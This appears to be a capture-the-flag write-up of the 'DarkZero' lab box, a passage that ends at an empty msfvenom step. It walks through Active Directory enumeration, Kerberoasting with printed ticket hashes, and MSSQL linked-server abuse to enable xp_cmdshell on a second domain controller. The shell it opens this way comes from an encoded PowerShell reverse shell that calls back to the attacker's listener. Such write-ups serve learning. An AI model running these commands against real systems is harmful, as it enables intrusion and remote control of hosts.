![[Pasted_image_20251005075358.png]]

We are given initial credentials..

```
As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!
```

## Recon

### Port Scan

```bash
sudo nmap -Pn -p- -sCV --min-rate 5000 -T 4 10.129.208.236
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 08:01 EAT
Nmap scan report for 10.129.208.236
Host is up (0.79s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-05 12:02:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.208.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-10-05T12:03:58+00:00; +7h00m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.208.236:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-05T06:00:50
|_Not valid after:  2055-10-05T06:00:50
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49891/tcp open  msrpc         Microsoft Windows RPC
49908/tcp open  msrpc         Microsoft Windows RPC
49940/tcp open  msrpc         Microsoft Windows RPC
52971/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-05T12:03:17
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.27 seconds
```

From the scan we identify the domain, `darkzero.htb` and the domain controller `DC01.darkzero.htb`. Lets add this entries to hosts file.

```bash
echo '10.129.208.236 darkzero.htb DC01.darkzero.htb' | sudo tee -a /etc/hosts   
[sudo] password for darklight: 
10.129.208.236 darkzero.htb DC01.darkzero.htb
```

We also have a clock skew of `6h59m59s`, more info about this and how to resolve it check out this note, [[Resolving clock_skew error]]

Next we generate the krb5 file and copy it to `/etc/krb5.conf`

```bash
nxc smb 10.129.208.236 -u 'john.w' -p 'RFulUtONCOL!' --generate-krb5-file darkzero.krb5
```


### Shares

No interesting shares.

```bash
nxc smb 10.129.208.236 -u 'john.w' -p 'RFulUtONCOL!' --shares                          
SMB         10.129.208.236  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)
SMB         10.129.208.236  445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
SMB         10.129.208.236  445    DC01             [*] Enumerated shares
SMB         10.129.208.236  445    DC01             Share           Permissions     Remark
SMB         10.129.208.236  445    DC01             -----           -----------     ------
SMB         10.129.208.236  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.208.236  445    DC01             C$                              Default share
SMB         10.129.208.236  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.208.236  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.208.236  445    DC01             SYSVOL          READ            Logon server share 
```


### RID Bruteforcing 

```bash
nxc smb 10.129.208.236 -u 'john.w' -p 'RFulUtONCOL!' --rid-brute 10000
SMB         10.129.208.236  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)
SMB         10.129.208.236  445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
SMB         10.129.208.236  445    DC01             498: darkzero\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.208.236  445    DC01             500: darkzero\Administrator (SidTypeUser)
SMB         10.129.208.236  445    DC01             501: darkzero\Guest (SidTypeUser)
SMB         10.129.208.236  445    DC01             502: darkzero\krbtgt (SidTypeUser)
SMB         10.129.208.236  445    DC01             512: darkzero\Domain Admins (SidTypeGroup)
SMB         10.129.208.236  445    DC01             513: darkzero\Domain Users (SidTypeGroup)
SMB         10.129.208.236  445    DC01             514: darkzero\Domain Guests (SidTypeGroup)
SMB         10.129.208.236  445    DC01             515: darkzero\Domain Computers (SidTypeGroup)
SMB         10.129.208.236  445    DC01             516: darkzero\Domain Controllers (SidTypeGroup)
SMB         10.129.208.236  445    DC01             517: darkzero\Cert Publishers (SidTypeAlias)
SMB         10.129.208.236  445    DC01             518: darkzero\Schema Admins (SidTypeGroup)
SMB         10.129.208.236  445    DC01             519: darkzero\Enterprise Admins (SidTypeGroup)
SMB         10.129.208.236  445    DC01             520: darkzero\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.208.236  445    DC01             521: darkzero\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.208.236  445    DC01             522: darkzero\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.208.236  445    DC01             525: darkzero\Protected Users (SidTypeGroup)
SMB         10.129.208.236  445    DC01             526: darkzero\Key Admins (SidTypeGroup)
SMB         10.129.208.236  445    DC01             527: darkzero\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.208.236  445    DC01             528: darkzero\Forest Trust Accounts (SidTypeGroup)
SMB         10.129.208.236  445    DC01             529: darkzero\External Trust Accounts (SidTypeGroup)
SMB         10.129.208.236  445    DC01             553: darkzero\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.208.236  445    DC01             571: darkzero\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.208.236  445    DC01             572: darkzero\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.208.236  445    DC01             1000: darkzero\DC01$ (SidTypeUser)
SMB         10.129.208.236  445    DC01             1101: darkzero\DnsAdmins (SidTypeAlias)
SMB         10.129.208.236  445    DC01             1102: darkzero\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.208.236  445    DC01             2601: darkzero\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.129.208.236  445    DC01             2602: darkzero\darkzero-ext$ (SidTypeUser)
SMB         10.129.208.236  445    DC01             2603: darkzero\john.w (SidTypeUser)
```


saving the output to a file and extraction the user i get this 

```bash
cat rid.dump | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\' -f 2
Administrator
Guest
krbtgt
DC01$
darkzero-ext$
john.w
```

### Roasting

#### Kerberoasting 

I only get the TGS for two accounts `krbtgt` and `DC01$` which i was not able to crack.

```bash
faketime -f "+7hrs" \
> impacket-GetUserSPNs darkzero.htb/john.w:'RFulUtONCOL!' -dc-ip 10.129.208.236 -usersfile users.txt -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$DARKZERO.HTB$*krbtgt*$46379e88bc46a6269fdb6b05$80d07018a14b806cd19eec6f445a99571cdd21574b2c6c96a0a2cb369ed5227d5d41459394cdb8961055ed0967f696007c0b3bb6bd77ff77cf2d66a9e29a7879e7d4529c6345885cd30b2cd34a6999c4d5adf860d37ad456cb9aa43ec42059b510ba05fbfdf1d92d55993c1810660e2edfe117a95dcf7be338c37ee6e4ac78efa527aee3ae51c523445f607b0f9a7b702845c7f2b7d7a4557218724bee6642e45701359ce515f5c5c8e6fc793d789d3cb179cadea064334ca9f102fb4cfb788e2bb565f19762be1e75a33a5087b43b79964dbebacb988037570d367017286a08a26517e7e0618a1587d45f58e2ea066ce6bf6b0a6ab874740d8548ab5f28362c850f3f856703e10e32b0bc11bd75a11a17138e75bdd6e749d3268fc6f1111a7b75a70bd45817208cbe9ec3c2c87856bac26ad1064471c08f2337118ef96d874877f4034b890400aa1624cd7dc42b216e318bf01acca76c7d3d34e668a2c7d83274ad38faa606ad26b3f53c6bd33ab6f2b8b1e35bf095c129e6a8361bca4d9244f16841a777ee8489ebb2d5e26410e3beac8148792a925819ef2a29d06de2a2708b2f3229d2e25d97344c8e7927b8574f11e27b789ce7ea39a87c7c06c49392cd61a7ce60deaf53690784d6d97fcbb960970e849ca3e145e700f3c55bdef182ff627b4752da459c2de099d0019b6ca3fe9a2535b2751cbf8748a567879bf3bc0b199da15dc467e964a5e7b63d12ff055e286d0c739d2c9778a53500817bd7000942424ee734fa47b37e902abd3ce77a49e5f17c1c4b7962d1c565d29651df9c7b98f14e18ed37ffbd96d13907fb41e8499c7c7cac7215fdd4788b58e556a68d2c6f0cd28590059e87f2d03221d9dba222e9ebd1799c6398534e8112adff481d7cdfa5dbc914cdb6cbd7a0b3b563a20f1d21290eb32f4c417ca87cfc24da2173fcdcb910763b5739a86acd2bd1f4f42763cfd5137fb00c19c6d4c4b6172b156ce7ca4ec1736f224b83a47a7f8fccc51b7a410ed69e63d959d1624e5d69969e4480aba20b47d671cb5009cdab8bed889aed3c29eecab202088904c6520054a9f96cf3561accd698bf4ce9b332bc24950f2b57cb6c942794c7d32cc1671b86d69f0d68f54e74f02cd44e39cf320240c2d18b891003b6a84bcaf46e8cca80cb25a49aa63e8a51d858f347cc762e7d09a2648d8ca7c0de89fc57ab74c208a95afb3c4f252b5b9be94bfd3b61e38acef680cb6dad6e456a672df0956cb8bb14a7159aedc8f76358a2944f9f250b01976500b8ffef8b6c0728872948c1f066188b1b42b71f832f693a16f03273fa921a0328d77d65eea2e2ede01a62f653367a942a3ed9c368c6130163e9e1820dba32eaf6b406827cdada6c4d18d7e549845fe3a1c16203b7999fbef09d9c8c5f871c1467a0a1d71ef87cabb85f6b012fcef870173267939d2a995b5b81f7700f035b5371b1d05748a8
$krb5tgs$18$DC01$$DARKZERO.HTB$*DC01$*$1509f2f538c997eb23f6c188$3ab6e31d87119aab279064d65aacc006c843b093a3b7004efdd2e0fca2190dbf21361e3f4b1ad89aa802dc9a3895aba305d4b8749139cfb53bdf65f4538ae6816019c0b32b55cacf00ec2a91cfa1793e2666aa0ff6764082c362170432f8ab2ec95e1ed3d8492763c751c7f76b91e9040263ece748e29c359128089cdf33269abb9c9769cf84934056eef8ea2ac459c589fb27d1c947d98b07647c992d0b4ba47130e3effe48d776b08a8f05c1111f9544e6824dd7858f1bc32363bade99033511c437dfe8fce308b16ea103d086b7c6f8e6096933c912d2226c4b42856cdc9234ab8ebeaa5e2ea6b873d69ac3470c49b612552a5b9d4bee7ac65208779c198355a0091fd2c819ad385079fd901633373630a7a7b7229ce2f5fb94baae60c9a73ddcea3b1205ef177adc9a0824021705ca7cda0dbf52ffacdd67497c3317a25b5848201000ca2f90c9dbc4cdb7870f1a20a35ea6ad8c87588c35aec9b4d435b11d371acb426c130c64029340915eb7ee7d9a4862ef3f944ffded0b743d2458a207cc03e8fa0058d87c93dd16abb45926b837062debbc32a83e718e338f5c14f44959b2e125ad3894cfe211dd964b64cff9a7ea67974e00c967ad548731af23e634c12cad1710a44e2a9efa97fc22680558845cf897dae62bc9e30f41b179a834b8a13a64d9f43a1cf887273f59856858bf3ac6eb9e460cbdf84c449657097b1befcbaa1626d8572bc353f1e2a7fd8fbde3f3b2a26e3ba877e68cbbef4498e8dd7aa0bee807b38461f7cefc8f6303f2513cdbac5061978712a51b8f815fe41710a41131df2244474f8a9b535e91b223ef7a008b472b80e1a4b7c250306d76d974a3af6e82e56587434a0b1f07c59290cba33d0d3a5f3457ad31bffb6c4f397f574ead6ff3bc1df1afd956444c35afd7432b81c9bf2c84269575a3fafe36d6ec28aaede8c88c484bc494268fb6f2307aac210f70a6ad2eb7183cd0693797ea91f3645fa38f626965716f215ef778b119a19e127f4e460c8439554da75d7e92796bd695e469e5d9605aa85ca7534a5c5cc447ba21667f4a88fd54fd4c00ed1c1765ba5aa6fcb409ffad80edb49d818145744e7bf8cec9cadd151a3d648e1ef65e9e0ad3c1f76e5b09374fd3580f648676fbb1fbdb1557450795e41459b4325530e573eb36168c39202e9f4c7139d17daff8c8d5af0aa518926d27f23773d190097cf232716e5e5e262527b3dc1c3d9f5fd109ff785ecb65f8f7e5b56e92704446c0acf6f2947bb63e9a133bad9982a2acc191681ee8d06e9218a2c7b16021d0aaa772b1916ae9381f22c89d1aa584c9e8cb9caceb30c9eab9b56641545b14416f4a479aea850373215a1b9cfaff30ce083ffb8909c7354d9e6618a100f6e2fa18e759b95ea943c34c6690fcff4065d1b5b2aea917fec529086e66ce143dc85fabbe61736edf841a52e3ba1619
[-] Principal: darkzero-ext$ - Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
[-] Principal: john.w - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```

#### AS_REP roasting 

Got nothing.

```bash
faketime -f "+7hrs" \
> impacket-GetNPUsers darkzero.htb/john.w:'RFulUtONCOL!' -dc-ip 10.129.208.236 -usersfile users.txt -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkzero-ext$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User john.w doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### AD Recon 

Collect AD data using the command below.

```bash
faketime -f "+7hrs" \
> bloodhound-ce-python -d darkzero.htb -ns 10.129.208.236 -u 'john.w' -p 'RFulUtONCOL!' -c ALL --zip 
```

![[Pasted_image_20251005092640.png]]

We have a `CrossForestTrust` between two domains. 

> [!NOTE]
> A **Cross-Forest Trust** is an Active Directory trust that links two separate AD forests so users and resources can be authenticated across forest boundaries—allowing principals from one forest to access resources in the other according to the trust direction and permissions; it can be configured as one-way or two-way and is typically transitive at the forest level, enabling Kerberos referrals between KDCs.

In our case it is a two-way trust.

Next i tried to identify the `DC` for `darkzero.ext` domain but i ended up with this.

```bash
nxc smb 10.129.208.0/24     
SMB         10.129.208.61   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)
SMB         10.129.208.236  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Two different IP addresses mapping to the same domain controller. It looks weird to me.

Trying extracting domain data using `DC01` domain controller but specifying to query `darkzero.ext` domain instead..

```bash
faketime -f "+7hrs" \
bloodhound-ce-python -d darkzero.ext -ns 10.129.208.236 -u 'john.w' -p 'RFulUtONCOL!' -c ALL --zip 
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: darkzero.ext
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc02.darkzero.ext:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc02.darkzero.ext
```

And we have the `DC` domain name `dc02.darkzero.ext` which proofs existence of another domain controller. I just need to get the IP address of the DC and add it to hosts file.

Using `dig`.

```bash
dig darkzero.ext @10.129.208.236 

; <<>> DiG 9.20.11-4+b1-Debian <<>> darkzero.ext @10.129.208.236
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 61954
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;darkzero.ext.			IN	A

;; ANSWER SECTION:
darkzero.ext.		599	IN	A	172.16.20.2

;; Query time: 228 msec
;; SERVER: 10.129.208.236#53(10.129.208.236) (UDP)
;; WHEN: Sun Oct 05 09:40:26 EAT 2025
;; MSG SIZE  rcvd: 57
```

The domain maps to IP `darkzero.ext`.

Getting the `Name Server (NS)` for the domain.

```bash
 dig NS darkzero.ext @10.129.208.236 +short
dc02.darkzero.ext.
```

And now we have the details for the new domain and its DC but currently we don't have access to the internal network. We can try to compromise `DC01` then pivot to the network.


From the port scan we have this `2179/tcp  open  vmrdp?`

> [!NOTE]
> Port **2179/tcp** is typically used by Microsoft Hyper-V’s VMConnect (VMRDP) service: the Hyper-V host listens on this port and accepts client connections, then maps each incoming session to the correct virtual machine (by VM identifier) and proxies a console-like RDP session to that guest—this provides out-of-band access to a VM’s console even when the guest OS network or in-guest RDP is unavailable. Unlike standard RDP on 3389, which connects directly to the OS inside the VM, vmrdp runs at the hypervisor layer and grants console-level access via the host.

With `xfreerdp3` we have the option `/vmconnect:` but it need the VM's GUID as the parameter. We need to have access to `DC01` so that we have be able to query the VM's GUID

#### Getting Writable object and attributes 

```bash
faketime -f "+7hrs" \
bloodyAD -d darkzero.htb --host DC01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=darkzero,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=john.w,CN=Users,DC=darkzero,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE

[ SNIP ]
```

We have this right.

```bash
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
```

#### msDS-AllowedToActOnBehalfOfOtherIdentity

[[Attributes#msDS-AllowedToActOnBehalfOfOtherIdentity]]

Checking if our target account, `administrator` allows delegation.

```bash
faketime -f "+7hrs" \
bloodyAD -d darkzero.htb --host DC01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' get object Administrator --attr userAccountControl

distinguishedName: CN=Administrator,CN=Users,DC=darkzero,DC=htb
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```

The administrator account allows delegation since the flag `NOT_DELEGATED` is not set in the target's `userAccountControl` attribute.

Wait .. we have the write permission the attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` of a user account and not a computer account. This makes it useless because we cannot configure any users or accounts to impersonate users in the Domain Controller.


#### 1433/tcp  open  ms-sql-s 

We had this port open running mysql 

```bash
└─$ impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.129.208.236 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    show_query                 - show query
    mask_query                 - mask query
    
SQL (darkzero\john.w  guest@master)> 
```

The aim is to enable `xp_cmdshell` and use it to execute a reverse shell command.

We don't have permissions to enable it.

```bash
SQL (darkzero\john.w  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

Enumerating  linked servers.

```bash
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   
```


> [!NOTE]
> In SQL Server, a **linked server** is a feature that allows one SQL Server instance to run queries against another SQL Server (or even different data sources) as if it were local. In our output, the machine `DC01` has a linked server connection to `DC02.darkzero.ext`, meaning queries from `DC01`’s SQL Server can be executed on `DC02`’s SQL Server. The second table shows the **login mapping** used for that linked connection: when the user `darkzero\john.w` on the local SQL instance connects to the linked server `DC02.darkzero.ext`, it does not use his own credentials but instead maps to the account `dc01_sql_svc` on the remote server. This is critical because if you control the SQL session as `john.w`, you may be able to impersonate `dc01_sql_svc` on `DC02` through the linked server connection. In short, linked servers let one SQL Server trust another.

Now we need to switch to DC01.darkzero.ext then try to enable `xp_cmdshell`

```bash
SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.                                        
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "hostname"
output   
------   
DC02     

NULL     

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "whoami"
output                 
--------------------   
darkzero-ext\svc_sql   

NULL                   

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> 

```

Now we execute a reverse shell command

```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA0ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

```bash
rlwrap nc -lvnp 1337         
listening on [any] 1337 ...
connect to [10.10.16.14] from (UNKNOWN) [10.129.208.236] 52086

PS C:\Windows\system32> whoami
darkzero-ext\svc_sql
PS C:\Windows\system32> hostname
DC02
PS C:\Windows\system32> 
```

 running winpeas i get this

 ```
  Version: NetNTLMv2
  Hash:    svc_sql::darkzero-ext:1122334455667788:3ba43b20223da29423f2cbb0303e35ba:01010000000000009dead4065636dc014307586d2a36b68f0000000008003000300000000000000000000000003000000cccf8b30a1b9f284ff882087ca9f428027d793bfeca11a5307592004a4240ed0a00100000000000000000000000000000000000090000000000000000000000
```
The hash is not crackable though.

Decide to use meterpreter to run windows exploit suggester. 

First we generate a msfvenom payload 

```bash
